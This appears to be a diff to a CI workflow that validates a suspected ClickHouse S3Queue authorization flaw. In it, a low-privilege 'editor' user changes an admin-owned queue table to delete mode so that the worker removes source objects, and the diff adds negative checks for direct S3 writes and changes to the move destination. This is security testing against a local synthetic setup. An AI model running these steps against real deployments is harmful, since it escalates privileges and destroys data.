@@ -9,8 +9,14 @@ jobs:
   e2e:
     runs-on: ubuntu-latest
     timeout-minutes: 20
+    strategy:
+      fail-fast: false
+      matrix:
+        ch_image: ["clickhouse/clickhouse-server:26.10.3.7", "clickhouse/clickhouse-server:head"]
     steps:
       - name: Start isolated S3-compatible server and unmodified ClickHouse
+        env:
+          CH_IMAGE: ${{ matrix.ch_image }}
         shell: bash
         run: |
           set -euo pipefail
@@ -43,7 +49,7 @@ jobs:
             -e CLICKHOUSE_USER=admin -e CLICKHOUSE_PASSWORD=synthetic-clickhouse-pass \
             -e CLICKHOUSE_DEFAULT_ACCESS_MANAGEMENT=1 \
             -v /tmp/ch-s3.xml:/etc/clickhouse-server/config.d/localhost.xml:ro \
-            clickhouse/clickhouse-server:26.10.3.7
+            "$CH_IMAGE"
           for i in {1..90}; do
             curl -fsS --user admin:synthetic-clickhouse-pass \
               'http://127.0.0.1:8123/?query=SELECT%201' >/dev/null && break
@@ -107,6 +113,10 @@ jobs:
           neg_unpriv=check("unprivileged_alter_rejected",code!=200,(code,body))
           code,body=run("SELECT * FROM s3('http://127.0.0.1:19000/synthetic-bucket/attack/test.csv','syntheticminio','syntheticminiopassword','CSV','id UInt32') LIMIT 1","editor")
           neg_read=check("editor_has_no_s3_read",code!=200,(code,body))
+          code,body=run("INSERT INTO FUNCTION s3('http://127.0.0.1:19000/synthetic-bucket/direct-write.csv','syntheticminio','syntheticminiopassword','CSV') SELECT toUInt32(900) AS id","editor")
+          neg_write=check("editor_has_no_s3_write",code==403 and "WRITE ON S3" in body,(code,body))
+          code,body=run("ALTER TABLE s3q_lab.q_attack MODIFY SETTING after_processing_move_uri='http://127.0.0.1:19000/synthetic-bucket/other'","editor")
+          neg_cross_move=check("editor_cannot_change_external_move_destination",code==403,(code,body))
           code,body=run(command,"editor")
           did_alter=check("editor_changes_delete_setting",code==200,(code,body))
           if not did_alter:
@@ -130,7 +140,7 @@ jobs:
           control_source=exists("keep/test.csv")
           check("control_keep_source_remains",control_source,control_source)
           check("delete_mode_removed_source",changed_source,changed_source)
-          if not neg_unpriv or not neg_read or not did_alter or not changed_source or not control_source:
+          if not neg_unpriv or not neg_read or not neg_write or not neg_cross_move or not did_alter or not changed_source or not control_source:
               print("VERDICT: no fully validated unauthorized-delete chain on this run",flush=True)
               sys.exit(3)
           print("CANDIDATE_E2E: Editor with ALTER SETTING only changed admin-owned S3Queue to DELETE; source object was removed by worker using saved credentials while control object survived. Evaluate intended ALTER authority and security policy before reporting.",flush=True)
